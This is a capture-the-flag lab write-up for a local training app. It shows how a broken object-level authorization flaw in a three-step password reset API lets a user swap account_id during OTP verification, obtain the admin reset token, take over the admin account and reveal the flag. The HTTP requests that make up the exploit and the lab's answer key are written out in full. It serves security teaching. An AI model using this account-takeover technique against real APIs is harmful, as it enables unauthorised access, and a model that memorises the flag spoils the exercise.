# Scenario 20: BOLA Multi-Step Password Reset Account Takeover

- **Port:** `8020`
- **Category:** Broken Object Level Authorization (BOLA / API Security)
- **Difficulty:** Expert
- **Flag:** `CTF{b0l4_p4ssw0rd_r3s3t_4cc0unt_t4k30v3r}`
- **Target URL:** `http://localhost:8020/login`

---

## Lab Description
This lab demonstrates a high-impact Broken Object Level Authorization (BOLA / API1:2023) vulnerability in a multi-stage corporate password recovery workflow.

The target is the Executive Administrator account (`admin@apexpay.io`, Account #100). You own account `carlos@apexpay.io` (Account #101, default password: `carlos123`, test OTP: `654321`).

The password recovery workflow consists of:
1. `POST /api/auth/forgot-password`: Requests a password reset session token.
2. `POST /api/auth/verify-reset-step`: Submits the session token, OTP, and target `account_id`.
3. `POST /api/auth/confirm-new-password`: Applies the new password using the generated reset token.

The vulnerability resides in **Step 2**: while you provide a valid OTP for Carlos's session, you can manipulate the `"account_id"` JSON parameter to specify the Admin's account ID (`100`). The server fails to validate object-level authorization and generates a valid password reset token for the Admin account in the response.

To solve this lab, exploit the BOLA flaw to issue an admin password reset token, reset `admin@apexpay.io`'s password, and log in to capture the flag from the executive treasury vault.

---

## Exploitation Walkthrough (Burp Suite Methodology)

### 1. Step 1 — Request Reset Session for Carlos
Send a request to generate a reset session for Carlos:
```http
POST /api/auth/forgot-password HTTP/1.1
Host: localhost:8020
Content-Type: application/json

{
  "email": "carlos@apexpay.io"
}
```
**Response:**
```json
{
  "success": true,
  "session_token": "sess_89a1b2c3d4e5f607",
  "account_id": 101
}
```

---

### 2. Step 2 — Exploit BOLA in OTP Verification
In **Burp Repeater**, submit Carlos's session token and OTP (`654321`), but tamper with `"account_id"` to target the administrator (`100`):
```http
POST /api/auth/verify-reset-step HTTP/1.1
Host: localhost:8020
Content-Type: application/json

{
  "session_token": "sess_89a1b2c3d4e5f607",
  "otp": "654321",
  "account_id": 100
}
```
**Response (Admin Reset Token Leaked!):**
```json
{
  "success": true,
  "message": "Identity verified for account #100 (admin@apexpay.io). Password reset token generated.",
  "account_id": 100,
  "email": "admin@apexpay.io",
  "reset_token": "rst_tok_0123456789abcdef0123456789abcdef"
}
```

---

### 3. Step 3 — Set New Password for Admin
Apply a new password using the stolen admin reset token:
```http
POST /api/auth/confirm-new-password HTTP/1.1
Host: localhost:8020
Content-Type: application/json

{
  "reset_token": "rst_tok_0123456789abcdef0123456789abcdef",
  "new_password": "PwnedAdminPassword123!"
}
```

---

### 4. Step 4 — Log in as Admin & Extract Flag
1. Navigate to `http://localhost:8020/login`.
2. Log in with:
   - **Email:** `admin@apexpay.io`
   - **Password:** `PwnedAdminPassword123!`
3. The dashboard verifies your executive administrator session, changes the lab status to **SOLVED 🎉**, and displays the CTF flag:
   ```text
   CTF{b0l4_p4ssw0rd_r3s3t_4cc0unt_t4k30v3r}
   ```
